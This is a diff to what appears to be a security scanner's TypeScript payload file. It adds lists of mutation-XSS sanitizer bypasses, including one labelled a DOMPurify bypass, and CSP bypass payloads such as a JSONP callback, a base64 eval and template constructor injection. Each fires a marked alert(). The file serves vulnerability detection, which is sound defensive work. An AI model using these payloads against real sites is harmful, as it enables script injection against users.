@@ -66,3 +66,33 @@ export const XSS_PAYLOADS: XSSPayload[] = [
  * @deprecated Use XSS_PAYLOADS[].marker instead. Kept for backward compatibility.
  */
 export const XSS_MARKERS = XSS_PAYLOADS.map(p => p.marker);
+
+/** Mutation XSS payloads — exploit browser parser quirks to bypass sanitizers */
+export const MUTATION_XSS_PAYLOADS: XSSPayload[] = [
+  // noscript breakout
+  { payload: '<noscript><img src=x onerror="alert(\'secbot-mxss-0\')"></noscript>', marker: 'secbot-mxss-0', type: 'dom' },
+  // Math namespace confusion
+  { payload: '<math><mi><table><mglyph><style><!--</style><img src=x onerror=alert("secbot-mxss-1")>', marker: 'secbot-mxss-1', type: 'dom' },
+  // SVG foreignObject
+  { payload: '<svg><foreignObject><body onerror=alert("secbot-mxss-2")><img src=x></body></foreignObject></svg>', marker: 'secbot-mxss-2', type: 'dom' },
+  // Style tag breakout in SVG
+  { payload: '<svg><style>{font-family:\'<img/src=x onerror=alert("secbot-mxss-3")>\'}</style></svg>', marker: 'secbot-mxss-3', type: 'dom' },
+  // DOMPurify bypass (namespace confusion)
+  { payload: '<math><mtext><table><mglyph><style><!--</style><img src onerror=alert("secbot-mxss-4")>', marker: 'secbot-mxss-4', type: 'dom' },
+  // Form tag injection
+  { payload: '<form><button formaction=javascript:alert("secbot-mxss-5")>click</button></form>', marker: 'secbot-mxss-5', type: 'dom' },
+  // Details/summary auto-execute
+  { payload: '<details open ontoggle=alert("secbot-mxss-6")><summary>x</summary></details>', marker: 'secbot-mxss-6', type: 'event-handler' },
+  // Nested template with script
+  { payload: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(\'secbot-mxss-7\') /></svg>#x" />', marker: 'secbot-mxss-7', type: 'dom' },
+];
+
+/** CSP bypass payloads — exploit weak CSP configurations */
+export const CSP_BYPASS_PAYLOADS: XSSPayload[] = [
+  { payload: '<base href="https://secbot-csp-test.example.com/">', marker: 'secbot-csp-0', type: 'dom' },
+  { payload: '<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(\'secbot-csp-1\')"></script>', marker: 'secbot-csp-1', type: 'reflected' },
+  { payload: '<img src=x onerror="eval(atob(\'YWxlcnQoInNlY2JvdC1jc3AtMiIp\'))">', marker: 'secbot-csp-2', type: 'event-handler' },
+  { payload: '<script src="data:text/javascript,alert(\'secbot-csp-3\')"></script>', marker: 'secbot-csp-3', type: 'reflected' },
+  { payload: '<object data="data:text/html,<script>alert(\'secbot-csp-4\')</script>">', marker: 'secbot-csp-4', type: 'dom' },
+  { payload: '{{constructor.constructor("alert(\'secbot-csp-5\')")()}}', marker: 'secbot-csp-5', type: 'template' },
+];
